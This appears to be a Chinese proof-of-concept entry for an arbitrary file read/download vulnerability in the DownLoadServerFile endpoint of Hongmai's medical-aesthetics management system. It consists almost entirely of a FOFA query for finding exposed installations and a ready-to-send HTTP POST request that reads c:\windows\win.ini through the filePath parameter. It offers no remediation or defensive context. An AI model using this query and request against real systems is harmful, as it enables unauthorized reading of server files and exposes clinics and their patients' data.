# 宏脉医美行业管理系统DownLoadServerFile任意文件读取下载漏洞

宏脉医美行业管理系统是由宏脉信息技术（广州）股份有限公司开发的一款服务于医美行业管理服务的系统。

## fofa

```yaml
title="宏脉医美行业管理系统"
```

## poc

```yaml
POST /zh-CN/PublicInterface/DownLoadServerFile HTTP/1.1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate

filePath=c:\windows\win.ini
```

